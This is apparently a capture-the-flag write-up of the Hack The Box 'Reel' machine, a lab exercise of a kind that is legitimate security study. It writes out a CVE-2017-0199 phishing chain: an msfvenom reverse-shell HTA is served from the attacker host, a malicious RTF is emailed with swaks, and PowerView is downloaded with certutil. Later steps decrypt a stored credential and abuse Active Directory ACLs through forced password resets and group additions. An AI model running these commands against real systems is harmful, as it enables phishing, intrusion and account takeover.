Really a good AD box, We need to do Phishing attack to get the initial shell and 1st user has WriteOwner Permission over another user. And 2nd User has some WriteDacl permission over a Group which has permission to access the Administrator directory.

Let's Begin with our Initial Nmap Scan.

## FTP Enumeration

Started my enumeration from FTP, and I logged in anonymously. There is a directory called `documents` and it has 3 files, so I downloaded them all to my machine.

`readme.txt` This file gives us a hint, We need to send an email in RTF format file.

```bash
root@kali:~/htb/boxes/reel# cat readme.txt
please email me any rtf format procedures - I’ll review and convert.

new format / converted documents will be saved here.
```

**What is RTF?** 

RTF is a text file format used by Microsoft products, such as Word and Office. RTF, or Rich Text Format, files were developed by Microsoft in 1987 for use in their products and for cross-platform document interchange. RTF is readable by most word processors.

While looking at those files, I checked the Exif and I got a valid mail address.

Since we know from the readme.txt, they expecting an RTF format document that needs to be sent through the mail. So I searched for exploits and found this repo. This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. 

> [https://github.com/bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)

## Getting User Shell

First, I used `msfvenom` to generate an HTA file that will give me a reverse shell.

```bash
root@kali:~/htb/boxes/reel/CVE-2017-0199# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.30 LPORT=1234 -f hta-psh -o shell.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 6592 bytes
Saved as: shell.hta
```

Next I will create the RTF file.

```bash
root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://10.10.14.16/shell.hta -x 0
Generating normal RTF payload.

Generated Invoice.rtf successfully
```

- `-M gen` - generate a document
- `-w Invoice.rtf` - RTF File
- `-u` - URL of the HTA file
- `-x 0` - Disabled rtf obfuscation

Now time to send the mail with our malicious RTF file. And I attached the RTF file and send to the `nico@megabank.com`

```bash
root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# swaks --server 10.10.10.77 --from wolf@megabank.com --to nico@megabank.com  --header 'Subject:Please Review this' --attach Invoice.rtf

In a few seconds, I got a hit on my python server.

```bash
root@kali:~/CTF/HTB/Boxes/Reel/CVE-2017-0199# python -m SimpleHTTPServer 80

```

And I got a shell

## PrivEsc → Tom

When I got through the files and Found encrypted password of user `tom` and they use Powershell's PSCredential, which provides a method to store usernames, passwords, and credentials. There are also two functions, Import-CliXml and Export-CliXml , which are used to save these credentials and restore them from a file.

```bash

I googled about how to decrypt it and found this link and `$cred=Import-CliXml -Path <file>; $cred.GetNetworkCredential().Password` this is the command which helps to decrypt.

```bash
C:\Users\nico\Desktop>powershell.exe -c "$cred=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml; $cred.GetNetworkCredential().Password"
powershell.exe -c "$cred=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml; $cred.GetNetworkCredential().Password"
1ts-mag1c!!!
```

We Know Port 22 is Open, So I used the password to Login.

Once I logged in, I uploaded SharpHound and collected all the information's needed BloodHound and downloaded it to my machine.

## PrivEsc → Claire

To get claire account, We can use the WriteOwner permission along with the functionality of PowerView.

- WriteOwner - change object owner to attacker controlled user take over the object

Steps:

- First we became the owner of Claire's ACL
- Then We get Reset Password Permission
- And use that permission to change it.

```bash
PS C:\Users\tom> certutil -urlcache -split -f http://10.10.14.30/PowerView.ps1              
****  Online  ****

PS C:\Users\tom> Set-DomainObjectOwner -identity claire -OwnerIdentity tom

PS C:\Users\tom> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force   
PS C:\Users\tom> Set-DomainUserPassword -identity claire -accountpassword $SecPassword      
```

Password Changed successfully.

And Im logged in SSH as Claire now.

## PrivEsc → Backup_Admins

While checking about Claire. I got to know she has one `First Degree Object Control` which means she has control directly over Backup_Admins.

![https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-reel/Untitled%205.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-reel/Untitled%205.png)

Since we have WriteDacl rights on the Backup_Admins group. I can use that to add her to the group.

Added her to that group.

```bash
PS C:\Users\claire> net group "Backup_Admins" claire /add /domain

## PrivEsc → Administrator

After some enumeration, I came to know Backup_Admins have access over Administrator Directory.
